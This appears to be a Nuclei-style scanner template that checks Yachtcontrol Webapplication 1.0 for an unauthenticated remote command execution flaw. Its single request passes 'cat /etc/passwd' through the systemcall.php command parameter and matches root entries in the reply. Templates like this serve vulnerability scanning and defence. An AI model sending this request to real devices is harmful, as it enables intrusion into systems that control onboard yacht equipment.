id: yachtcontrol-rce

info:
  name: Yachtcontrol Webapplication 1.0 - Unauthenticated Rce
  author: pikpikcu
  severity: high
  reference: |
    - https://www.exploit-db.com/exploits/47760
  description: |
    Yachtcontrol software is being used for controlling several aspects on yachts, as the name implies. Having access to the webapplication,
    it's possible to control several items such as lights, powergenerator, solarcontrol, airco, wipers, heating and other components
    Websoftware is built in PHP and mostly runs on a Linux based firmware device, controlling several other components related to the Yacht
    Other related software running on the same firmware device are custom compiled ELF binaries for controlling related onboard devices
  tags: rce,yachtcontrol

requests:
  - method: GET
    path:
      - "{{BaseURL}}/pages/systemcall.php?command=cat%20/etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0"
        condition: and

      - type: status
        status:
          - 200
